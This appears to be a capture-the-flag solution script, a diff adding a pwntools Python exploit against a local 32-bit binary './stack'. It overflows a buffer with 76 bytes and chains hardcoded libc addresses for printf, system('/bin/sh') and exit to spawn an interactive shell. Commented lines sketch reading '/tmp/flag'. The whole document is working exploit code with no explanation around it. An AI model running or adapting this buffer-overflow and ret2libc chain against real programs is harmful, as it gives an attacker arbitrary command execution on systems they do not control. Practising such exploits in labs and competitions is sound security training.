@@ -1,0 +1,38 @@
+from pwn import *
+p = process("./stack")
+
+PR = 0x8049022
+# "pop ret" gagdet is used for cleaning stack, in 32bit system
+
+num = 76
+payload = b'A' * num
+
+# open("/tmp/flag", 0)  #some note for file reading
+# read(3, buf, 1048)
+# write(1, buf, 1048)
+
+# BUF = 0x804c500
+# payload += p32(READ)
+# payload += p32(PPPR)
+# payload += p32(0)
+# payload += p32(BUF)
+# payload += p32(len("/tmp/flag"))
+
+payload += p32(0xf7c51450) # printf
+payload += p32(PR)
+payload += p32(0xf7dbbfd1) # "/bin/sh"
+
+payload += p32(0xf7c49b50) # system 
+payload += p32(PR)
+payload += p32(0xf7dbbfd1) # "/bin/sh" 
+
+payload += p32(0xf7c388a0) # exit
+payload += p32(0xdeadbeef)
+payload += p32(0) # nicely exit
+
+p.sendline(payload)
+
+#p.recvuntil("blabla") #receive data until one of delims ("blabla") is encountered.
+#p.send("/tmp/flag")  # send more info 
+
+p.interactive()
